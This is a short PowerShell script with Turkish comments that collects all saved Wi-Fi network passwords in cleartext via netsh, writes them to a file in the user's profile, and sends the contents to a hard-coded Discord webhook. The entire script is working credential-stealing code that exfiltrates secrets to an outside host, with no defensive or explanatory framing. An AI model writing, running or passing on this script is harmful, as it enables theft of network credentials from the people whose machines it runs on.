# Wi-Fi şifrelerini wifipass.txt dosyasına yaz
netsh wlan show profile name="*" key=clear > "$env:USERPROFILE\wifipass.txt"

# Discord webhook URL'si
$webhookUrl = "https://discord.com/api/webhooks/1397314423084810250/BKCu31_MoFQOrfWi6ZGFGa7CXbGAcnIqeRfZXDXL7IG2Y0kRN6lYT_fxibN-8fIcBfTN"

# Dosya içeriğini oku
$filePath = "$env:USERPROFILE\wifipass.txt"
$fileContent = Get-Content $filePath -Raw

# JSON formatına uygun hale getir (çift tırnakları kaçır)
$payload = '{ "content": "```' + ($fileContent -replace '"','\"') + '```" }'

# Discord'a POST isteği gönder
Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json"
